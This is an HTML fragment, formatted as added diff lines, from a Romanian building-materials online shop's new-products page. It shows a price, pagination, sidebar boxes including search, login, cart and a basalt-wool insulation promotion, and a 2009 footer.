+                          <td class="pic_corn_b"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                          <td><img src="images/pic_corn_br.gif" border="0" alt="" width="15" height="5"></td>
+                        </tr>
+                    </table></td>
+                                </tr>
+                                <tr>
+                                    <td style="height:20px;"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                                </tr>
+                                <tr>
+                                    <td style="height:54px;">
+			<table cellpadding="0" cellspacing="0" border="0" class="cont_body_table_3">
+				<tr><td>
+					<table cellpadding="0" cellspacing="0" border="0">
+						<tr>
+							<td></td>
+							<td width="100%" class="cont_body_tall_t_3"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+							<td></td>
+						</tr>												
+					</table>
+				</td></tr>
+				<tr><td style="vertical-align:middle;text-align:center;height:49px;">
+                                                    <table cellpadding="0" cellspacing="0" border="0" style="height:49px">
+                                                        <tr>
+                                                            <td style="width:50%;" class="vam">
+																<table cellpadding="0" cellspacing="5" border="0">
+																	<tr><td align="center"><span class="productSpecialPrice">46,78?RON</td></tr>
+																</table>
+															</td>
+                                                            <td style="width:50%" align="center">
+																<table cellpadding="0" cellspacing="0" border="0" style="width:1px;">
+																	<tr><td style="text-align:right;"><a href="http://www.materialedeconstructii-mm.ro/product_info.php?products_id=398"><img src="includes/languages/english/images/buttons/button_details.gif" border="0" alt="" width="65" height="21"></a><br /><img src="images/spacer.gif" border="0" alt="" width="1" height="5"><br /><a href="http://www.materialedeconstructii-mm.ro/products_new.php?action=buy_now&amp;products_id=398"><img src="includes/languages/english/images/buttons/button_add_to_cart1.gif" border="0" alt="" width="121" height="21"></a></td></tr>
+																</table>
+															</td>
+															<td><img src="images/spacer.gif" border="0" alt="" width="5" height="1"></td>
+                                                        </tr>
+                                                    </table> 
+                                      </td></tr></table>
+                                    </td>
+                                </tr>
+                            </table></td>
+                            <td class="cont_body_tall_r_2"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                        </tr>
+                        <tr>
+                            <td><img src="images/cont_body_corn_bl_2.gif" border="0" alt="" width="6" height="5"></td>
+                            <td width="100%" class="cont_body_tall_b_2"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                            <td><img src="images/cont_body_corn_br_2.gif" border="0" alt="" width="6" height="5"></td>
+                        </tr>
+                    </table></td>  
+  </tr> 	
+</table>
+</td>
+  </tr> 	
+</table>
+
+			  
+
+       
+	           
+        <table border="0" width="100%" cellspacing="0" cellpadding="0" class="result">
+          <tr>
+            <td>Afisari de la <b>961</b> Pana la <b>964</b> (of <b>1134</b> produse noi)</td>
+            <td class="result_right">Rezultate: <a href="http://www.materialedeconstructii-mm.ro/products_new.php?page=240" class="pageResults" title=" Pagina anterioara "><u>[&lt;&lt;&nbsp;Anterioara]</u></a>&nbsp;&nbsp;<a href="http://www.materialedeconstructii-mm.ro/products_new.php?page=240" class="pageResults" title=" Inapoi 5 pagini ">...</a>&nbsp;<b>241</b>&nbsp;&nbsp;<a href="http://www.materialedeconstructii-mm.ro/products_new.php?page=242" class="pageResults" title=" Pagina 242 "><u>242</u></a>&nbsp;&nbsp;<a href="http://www.materialedeconstructii-mm.ro/products_new.php?page=243" class="pageResults" title=" Pagina 243 "><u>243</u></a>&nbsp;&nbsp;<a href="http://www.materialedeconstructii-mm.ro/products_new.php?page=244" class="pageResults" title=" Pagina 244 "><u>244</u></a>&nbsp;&nbsp;<a href="http://www.materialedeconstructii-mm.ro/products_new.php?page=245" class="pageResults" title=" Pagina 245 "><u>245</u></a>&nbsp;<a href="http://www.materialedeconstructii-mm.ro/products_new.php?page=246" class="pageResults" title=" Inainte 5 pagini ">...</a>&nbsp;&nbsp;<a href="http://www.materialedeconstructii-mm.ro/products_new.php?page=242" class="pageResults" title=" Urmatoarea pagina "><u>[Urmatoarea&nbsp;&gt;&gt;]</u></a>&nbsp;</td>
+          </tr>
+        </table>
+
+        
+		        
+
+    	
+</td>
+                    <td class="cont_body_tall_r"><img src="images/bgright.gif" border="0" alt="" width="15" height="3"></td>
+                </tr>
+                <tr>
+                    <td><img src="images/cont_body_corn_bl.gif" border="0" alt="" width="15" height="15"></td>
+                    <td width="100%" class="cont_body_tall_b"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                    <td><img src="images/cont_body_corn_br.gif" border="0" alt="" width="15" height="15"></td>
+                </tr>
+            </table>
+		
+
+
+
+    </td>
+<!-- body_text_eof //-->
+    <td class="col_right">
+<!-- right_navigation //-->
+<table border="0"cellspacing="0" cellpadding="0" class="box_width_right">
+	<tr>
+		<td width="100%">
+			<table border="0" cellspacing="0" cellpadding="0">
+            	<tr><td>
+            	<div id="craftysyntax" align="center">
+<script type="text/javascript" src="http://www.materialedeconstructii-mm.ro/asistenta/livehelp_js.php?eo=1&department=1&amp;serversession=1&amp;pingtimes=15"></script>
+
+</div>
+            	</td></tr><!-- Powered by: Crafty Syntax Live Help        http://www.craftysyntax.com/ -->
+
+<!-- copyright 2003 - 2009 by Eric Gerdes --> 
+
+			
+<!-- search //-->
+          <tr>
+            <td>
+<table cellpadding='0' cellspacing='0' border='0' class='box'><tr><td class='box-head' align='center'><span classs='textBoxHead'>CAUTARE</span></td></tr><tr><td class='box-content'><table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="0"  style="margin-bottom:5px;" class="box_body_table">
+  <tr>
+    <td align="center"  style="width:240px;" class="box_body box_body_td"><form name="quick_find" action="http://www.materialedeconstructii-mm.ro/advanced_search_result.php" method="get">							   
+						<table cellpadding="0" cellspacing="4" border="0">
+							<tr><td colspan="2" style="width:100%;vertical-align:middle;"><input type="text" name="keywords" size="10" maxlength="30"  style="height:19px; width:100%;"></td></tr>
+							<tr><td class="bg_input"><input type="image" src="includes/languages/english/images/buttons/button_quick_find.gif" border="0" alt="Cautare Rapida" title=" Cautare Rapida "  style="float:right;vertical-align:middle;margin:0px 0px 0px 12px;">Folositi cuvinte cheie pentru a gasi un produs ( ex. nume produs, cuvant sugestiv produs. )</td></tr>
+							<tr><td><em><a href="http://www.materialedeconstructii-mm.ro/advanced_search.php">Cautare Avansata</a></em></td></tr>
+						</table>							   
+						</form></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+</td></tr><tr><td class='box-footer'></td></tr></table>            </td>
+          </tr>
+<!-- search_eof //-->
+
+<!-- loginbox //-->
+          
+<table cellpadding='0' cellspacing='0' border='0' class='box'><tr><td class='box-head' align='center'><span classs='textBoxHead'>INTRA IN CONT</span></td></tr><tr><td class='box-content'><table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="0"  style="margin-bottom:5px;" class="box_body_table">
+  <tr>
+    <td align="center"  style="width:240px;" class="box_body box_body_td"><form name="login" action="http://www.materialedeconstructii-mm.ro/login.php?action=process" method="post">Email: <input type="text" name="email_address" size="10" maxlength="100" style="width: 95px"><br><br>Parola: <input type="password" name="password" size="10" maxlength="40" style="width: 95px"><p><a href="http://www.materialedeconstructii-mm.ro/password_forgotten.php">Recuperare Parola</a><p><p><a href="http://www.materialedeconstructii-mm.ro/create_account.php">Creare Cont Nou</a><p><input type="image" src="includes/languages/english/images/buttons/button_login.gif" border="0" alt="Logare" title=" Logare " SSL>&nbsp;&nbsp;</a><br></form><BR></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+</td></tr></td></tr><tr><td class='box-footer'></td></tr></table>           
+
+<!-- loginbox_eof //-->
+<!-- shopping_cart //-->
+          <tr>
+            <td>
+<table cellpadding='0' cellspacing='0' border='0' class='box'><tr><td class='box-head' align='center'><span classs='textBoxHead'>Cos cumparaturi</span></td></tr><tr><td class='box-content'><table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="0"  style="margin-bottom:5px;" class="box_body_table">
+  <tr>
+    <td  style="width:240px;" class="box_body box_body_td"><table cellpadding="0" cellspacing="0" border="0" width="100%" align="center"><tr><td> &nbsp; 0  produse</td></tr></table></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+</td></tr><tr><td class='box-footer'></td></tr></table>            </td>
+          </tr>
+<!-- shopping_cart_eof //-->
+		<tr>
+            <td>
+			<table cellpadding='0' cellspacing='0' border='0' class='box'><tr><td class='box-head' align='center'><span classs='textBoxHead'>LINKURI UTILE</span></td></tr><tr><td class='box-content'>           
+            
+            <a href="http://www.materialedeconstructii-mm.ro/account.php" style="margin-left:20px; color:#0033CC; font-weight:bold; text-decoration:none;">&raquo; Contul Meu</a><br>
+            <a href="http://www.materialedeconstructii-mm.ro/products_new.php" style="margin-left:20px; color:#0033CC; font-weight:bold; text-decoration:none;">&raquo; Produse Noi</a><br>
+			<a href="http://www.materialedeconstructii-mm.ro/links.php" style="margin-left:20px; color:#0033CC; font-weight:bold; text-decoration:none;">&raquo; Schimb de Linkuri</a><br>
+		    <a href="http://www.materialedeconstructii-mm.ro/privacy.php" style="margin-left:20px; color:#0033CC; font-weight:bold; text-decoration:none;">&raquo; Termeni si Conditii</a><br>
+            <a href="http://www.materialedeconstructii-mm.ro/contact_us.php" style="margin-left:20px; color:#0033CC; font-weight:bold; text-decoration:none;">&raquo; Contact</a>
+            
+            </td></tr><tr><td class='box-footer'></td></tr></table>			</td>
+          </tr><!-- tell_a_friend //-->
+          <tr>
+            <td>
+<table cellpadding='0' cellspacing='0' border='0' class='box'><tr><td class='box-head' align='center'><span classs='textBoxHead'>Recomanda unui prieten</span></td></tr><tr><td class='box-content'><table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="0"  style="margin-bottom:5px;" class="box_body_table">
+  <tr>
+    <td align="center"  style="width:240px;" class="box_body box_body_td"><form name="tell_a_friend" action="http://www.materialedeconstructii-mm.ro/tell_a_friend.php" method="get">
+						
+						<table cellpadding="0" cellspacing="4" border="0" class="" style="height:3px;">
+							<tr>
+							<td style="width:100%;vertical-align:middle;">
+								<input type="text" name="to_email_address" size="10" style=" width:100%;"><br><br><center>
+								<input type="image" src="includes/languages/english/images/buttons/button_tell_a_friend.gif" border="0" alt="Recomanda unui prieten" title=" Recomanda unui prieten "><input type="hidden" name="products_id"><br><br>Recomanda cuiva ce stiti despre acest produs.</center>
+							</td></tr>
+							<tr><td colspan="2"></td></tr>
+						</table>							   
+						</form></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+</td></tr><tr><td class='box-footer'></td></tr></table>            </td>
+          </tr>
+<!-- tell_a_friend_eof //-->
+<!-- whats_new //-->
+          <tr>
+            <td class="">
+<table cellpadding='0' cellspacing='0' border='0' class='box'><tr><td class='box-head' align='center'><span classs='textBoxHead'>PRODUSE NOI</span></td></tr><tr><td class='box-content'><table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="0"  style="margin-bottom:5px;" class="box_body_table">
+  <tr>
+    <td align="center"  style="width:240px;" class="box_body box_body_td">
+                    <table cellpadding="0" cellspacing="0" border="0">
+                        <tr>
+                            <td align="center"><table cellpadding="0" cellspacing="0" border="0" class="pic table_pic_width">
+									<tr>
+									  <td><img src="images/pic_corn_tl.gif" border="0" alt="" width="17" height="5"></td>
+									  <td class="pic_corn_t"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+									  <td><img src="images/pic_corn_tr.gif" border="0" alt="" width="15" height="5"></td>
+									</tr>
+                                    <tr>
+                                        <td class="pic_corn_l"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                                        <td class="image"><a href="http://www.materialedeconstructii-mm.ro/vata-bazaltica-placi-rockmin-plus-1080-pret-promotie-baxuri-p-2467.html"><img src="images/VATA BAZALTICA.jpg" border="0" alt="Vata bazaltica placi 5 cm ROCKMIN PLUS Bax 10.80 m2 Pret Promotie la 30 Bax-uri" title=" Vata bazaltica placi 5 cm ROCKMIN PLUS Bax 10.80 m2 Pret Promotie la 30 Bax-uri " width="124" height="86"></a></td>
+                                        <td class="pic_corn_r"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+                                    </tr>
+                                    <tr>
+									  <td><img src="images/pic_corn_bl.gif" border="0" alt="" width="17" height="5"></td>
+									  <td class="pic_corn_b"><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+									  <td><img src="images/pic_corn_br.gif" border="0" alt="" width="15" height="5"></td>
+                                    </tr>
+                                </table></td>
+                        </tr>
+                        <tr>
+                            <td align="center" style="height:20px;" class="vam">
+	  <span><a href="http://www.materialedeconstructii-mm.ro/vata-bazaltica-placi-rockmin-plus-1080-pret-promotie-baxuri-p-2467.html">Vata bazaltica placi 5 cm ROCKMIN PLUS Bax 10.80 m2 Pret Promotie la 30 Bax-uri</a></span>
+	  </td>
+                        </tr>						
+                        <tr>
+                            <td style="height:20px;" align="center" class="vam"><span class="productSpecialPrice">95,50?RON</span></td>
+                        </tr>
+                </table> 
+								 </td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+</td></tr><tr><td class='box-footer'></td></tr></table>            </td>
+          </tr>
+<!-- whats_new_eof //-->
+			</table>
+		</td>
+	</tr>
+</table>
+
+<!-- right_navigation_eof //-->
+    </td>
+  </tr>
+</table>
+<!-- body_eof //-->
+
+<!-- footer //-->
+                     </td>
+                    <td><img src="images/spacer.gif" border="0" alt="" width="1" height="1"></td>
+				</tr>
+			</table>
+          </td>
+	</tr>
+	<tr>
+		<td>
+			<table style=" width:1024px; padding:7px 7px 0px 7px;" cellpadding="0" cellspacing="0" border="0" class="footer" align="center">
+				<tr>
+					<td width="1024">
+                    <table width="1024" border="0" cellspacing="0" cellpadding="0">
+                      <tr>
+                        <td height="5" background="images/bg-footer.gif"></td>
+                      </tr>
+                      <tr>
+                        <td height="35" align="center" style=" width:1024px; padding:7px 7px 7px 7px;">&copy; 2009 MASTER MATCONS &nbsp; Web Design by <a href="http://www.worldwidewebs.ro/">World Wide Webs</a></td>
+                      </tr>
+                    </table>
+                    </td>	
+				</tr>
+			</table>
+         </td>
+	</tr>
+</table>
+</td>
+  
+  </tr>  
+</table>
+<!-- footer_eof //--></body>
+</html>
